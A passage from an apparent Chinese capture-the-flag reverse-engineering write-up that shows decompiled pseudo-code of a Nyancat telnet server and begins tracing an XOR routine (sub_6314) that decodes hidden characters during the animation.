+ v17), v17);</span><br><span class="line">              <span class="built_in">fflush</span>(stdout);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">-5</span> &amp;&amp; v17 == <span class="number">24</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c%c&quot;</span>, <span class="number">255LL</span>, <span class="number">250LL</span>, <span class="number">24LL</span>, <span class="number">1LL</span>, <span class="number">255LL</span>, <span class="number">240LL</span>);</span><br><span class="line">                <span class="built_in">fflush</span>(stdout);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">              v17 = <span class="built_in">getchar</span>();</span><br><span class="line">              <span class="keyword">if</span> ( !*((_BYTE *)&amp;unk_104E0 + v17) )</span><br><span class="line">                *((_BYTE *)&amp;unk_104E0 + v17) = <span class="number">-2</span>;</span><br><span class="line">              <span class="built_in">sub_66AF</span>(*((<span class="keyword">unsigned</span> __int8 *)&amp;unk_104E0 + v17), v17);</span><br><span class="line">              <span class="built_in">fflush</span>(stdout);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">              v34 = <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v33 &amp;&amp; v32 &lt;= <span class="number">0x3FE</span>u )</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)s + v32++) = v18;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">alarm</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    haystack = <span class="built_in">getenv</span>(<span class="string">&quot;TERM&quot;</span>);</span><br><span class="line">    <span class="built_in">ioctl</span>(<span class="number">0</span>, <span class="number">0x5413</span>uLL, v5);</span><br><span class="line">    dword_E1FC = (<span class="keyword">unsigned</span> __int16)v5[<span class="number">1</span>];</span><br><span class="line">    dword_E200 = (<span class="keyword">unsigned</span> __int16)v5[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v36 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = j;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(haystack) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      haystack[j] = <span class="built_in">tolower</span>(haystack[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;xterm&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;toaru&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;linux&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vtnt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;cygwin&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vt220&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;fallback&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;rxvt-256color&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;rxvt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vt100&quot;</span>) &amp;&amp; dword_E1FC == <span class="number">40</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(haystack, <span class="string">&quot;st&quot;</span>, <span class="number">2uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">2</span>, sub_64A8);</span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">13</span>, sub_64E6);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_104C0 )</span><br><span class="line">    <span class="built_in">signal</span>(<span class="number">28</span>, handler);</span><br><span class="line">  <span class="built_in"><span class="keyword">switch</span></span> ( v36 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[48;5;17m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[48;5;231m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[48;5;16m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[48;5;230m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[48;5;175m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[48;5;162m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[48;5;196m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[48;5;214m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[48;5;226m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[48;5;118m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[48;5;33m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[48;5;19m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[48;5;240m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[48;5;175m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[104m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[107m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[105m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[101m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[101m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[103m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[102m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[104m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[100m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[105m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[25;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[5;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[25;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[5;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[5;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[5;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[5;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[25;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[5;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[5;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[25;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[5;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[5;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[5;45m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[0;30;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[0;33;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[1;33;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[1;32;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[1;34;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[1;30;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      off_FA88 = (<span class="keyword">char</span> *)&amp;unk_BCFF;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[0;30;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[0;33;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[1;33;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[1;32;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[1;34;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[1;30;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      off_FA88 = (<span class="keyword">char</span> *)&amp;unk_BD06;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      qword_FE20 = (__int64)&amp;unk_BD09;</span><br><span class="line">      qword_FE30 = (__int64)&amp;unk_BD0C;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;  &quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)&amp;unk_BD0F;</span><br><span class="line">      qword_FDE0 = (__int64)&amp;unk_BD12;</span><br><span class="line">      qword_FE28 = (__int64)&amp;unk_BD15;</span><br><span class="line">      qword_FEB0 = (__int64)&amp;unk_BD0F;</span><br><span class="line">      qword_FDF0 = (__int64)&amp;unk_BD18;</span><br><span class="line">      qword_FE18 = (__int64)&amp;unk_BD1B;</span><br><span class="line">      qword_FDD8 = (__int64)&amp;unk_BD1E;</span><br><span class="line">      qword_FEA8 = (__int64)&amp;unk_BD21;</span><br><span class="line">      qword_FE98 = (__int64)&amp;unk_BD24;</span><br><span class="line">      qword_FE10 = (__int64)&amp;unk_BD27;</span><br><span class="line">      qword_FDE8 = (__int64)&amp;unk_BD2A;</span><br><span class="line">      v27 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      qword_FE20 = (__int64)&amp;unk_BD2D;</span><br><span class="line">      qword_FE30 = (__int64)&amp;unk_BD2F;</span><br><span class="line">      qword_FDF8 = (__int64)&amp;unk_BD31;</span><br><span class="line">      qword_FEC0 = (__int64)&amp;unk_BD33;</span><br><span class="line">      qword_FDE0 = (__int64)&amp;unk_BD35;</span><br><span class="line">      qword_FE28 = (__int64)&amp;unk_BD37;</span><br><span class="line">      qword_FEB0 = (__int64)&amp;unk_BD33;</span><br><span class="line">      qword_FDF0 = (__int64)&amp;unk_BD39;</span><br><span class="line">      qword_FE18 = (__int64)&amp;unk_BD3B;</span><br><span class="line">      qword_FDD8 = (__int64)&amp;unk_BD3D;</span><br><span class="line">      qword_FEA8 = (__int64)&amp;unk_BD3F;</span><br><span class="line">      qword_FE98 = (__int64)&amp;unk_BD41;</span><br><span class="line">      qword_FE10 = (__int64)&amp;unk_BD43;</span><br><span class="line">      qword_FDE8 = (__int64)&amp;unk_BD45;</span><br><span class="line">      v27 = <span class="number">1</span>;</span><br><span class="line">      dword_E1FC = <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E1F4 == dword_E1F8 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_E1F4 = (dword_E1FC / <span class="number">-2</span> + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">    dword_E1F8 = (dword_E1FC / <span class="number">2</span> + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">    byte_104CB = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E1EC == dword_E1F0 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_E1EC = (<span class="number">65</span> - dword_E200) / <span class="number">2</span>;</span><br><span class="line">    dword_E1F0 = (dword_E200 + <span class="number">63</span>) / <span class="number">2</span>;</span><br><span class="line">    byte_104CC = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E108 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1BkNyanyanyanyanyanyanya...\x1B\\&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B]1;Nyanyanyanyanyanyanya...\a&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B]2;Nyanyanyanyanyanyanya...\a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H\x1B[2J\x1B[?25l&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v16; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">3LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                             \x1B[1mNyancat Telnet Server\x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                   written and run by \x1B[1;32mK. Lange\x1B[1;34m @_klange\x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        If things don&#x27;t look right, try:&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">1LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                TERM=fallback telnet ...&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Or on Windows:&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">1LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                telnet -t vtnt ...&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Problems? Check the website:&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">1LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                \x1B[1;34mhttp://nyancat.dakko.us\x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        This is a telnet server, remember your escape keys!&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">1LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                \x1B[1;31m^]quit\x1B[0m to exit&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">2LL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Starting in %d...                \n&quot;</span>, v16 - j);</span><br><span class="line">      <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      <span class="built_in">usleep</span>(<span class="number">0x61A80</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[u&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H\x1B[2J\x1B[?25l&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">time</span>(&amp;timer);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v14 = off_FA88;</span><br><span class="line">  <span class="keyword">while</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[u&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( k = dword_E1EC; k &lt; dword_E1F0; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( l = dword_E1F4; l &lt; dword_E1F8; ++l )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( k &lt;= <span class="number">23</span> || k &gt; <span class="number">42</span> || l &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( l &gt;= <span class="number">0</span> &amp;&amp; k &gt;= <span class="number">0</span> &amp;&amp; k &lt;= <span class="number">63</span> &amp;&amp; l &lt;= <span class="number">63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = off_FA20[v26][k][l];</span><br><span class="line">            off_FA88 = (<span class="keyword">char</span> *)<span class="built_in">sub_6314</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v26, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)k, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)l, v14);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v21 = <span class="number">44</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v20 = (<span class="number">2</span> - l) % <span class="number">16</span> / <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ((v26 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            v20 = <span class="number">1</span> - v20;</span><br><span class="line">          v11 = <span class="string">&quot;,,&gt;&gt;&amp;&amp;&amp;+++###==;;;,,&quot;</span>;</span><br><span class="line">          v21 = asc_BFE3[v20 - <span class="number">23</span> + k];</span><br><span class="line">          <span class="keyword">if</span> ( !v21 )</span><br><span class="line">            v21 = <span class="number">44</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v27 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;unk_FCC0 + v21));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v21 == v24 || !*((_QWORD *)&amp;unk_FCC0 + v21) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, off_FA88);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v24 = v21;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;unk_FCC0 + v21), off_FA88);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_65E2</span>(<span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E100 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">time</span>(&amp;time1);</span><br><span class="line">      v13 = <span class="built_in">difftime</span>(time1, timer);</span><br><span class="line">      v12 = <span class="built_in">sub_63FF</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">int</span>)v13);</span><br><span class="line">      <span class="keyword">for</span> ( m = (dword_E1FC - <span class="number">29</span> - v12) / <span class="number">2</span>; m &gt; <span class="number">0</span>; --m )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      dword_E1E8 += <span class="built_in">printf</span>(<span class="string">&quot;\x1B[1;37mYou have nyaned for %d times!\x1B[J\x1B[0m&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)++dword_108E0);</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    ++v25;</span><br><span class="line">    <span class="keyword">if</span> ( dword_104C4 &amp;&amp; v25 == dword_104C4 )</span><br><span class="line">      <span class="built_in">sub_6471</span>();</span><br><span class="line">    <span class="keyword">if</span> ( !off_FA20[++v26] )</span><br><span class="line">      v26 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">usleep</span>(<span class="number">1000</span> * v29);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据字符串来入手，这里main()中相关的是<strong>off_FA88</strong>和<strong>printf(“\x1B[1;37mYou have nyaned for %d times!\x1B[J\x1B[0m”, (unsigned int)++dword_108E0);</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">off_FA88 = (<span class="keyword">char</span> *)<span class="built_in">sub_6314</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v26, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)k, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)l, v14);</span><br></pre></td></tr></table></figure>

<p>继续跟进sub_6314代码，反汇编后的伪代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_6314</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">18</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)a4;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">4</span> || a3 &gt; <span class="number">54</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)a4;</span><br><span class="line">  byte_104C9 = <span class="number">32</span>;</span><br><span class="line">  dword_E120[a3 - <span class="number">5</span>] ^= <span class="built_in">sub_62B5</span>(); <span class="comment">//异或操作</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">sub_62E3</span>(dword_E120[a3 - <span class="number">5</span>]) )</span><br><span class="line">    byte_104C8 = dword_E120[a3 - <span class="number">5</span>] &amp; <span class="number">0x7F</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    byte_104C8 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">return</span> &amp;byte_104C8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的返回值a4即为off_FA88,所以只能在a2&#x3D;18的时候运行，然后对dword_E120[]循环50次进行赋值，伪代码如下</p>
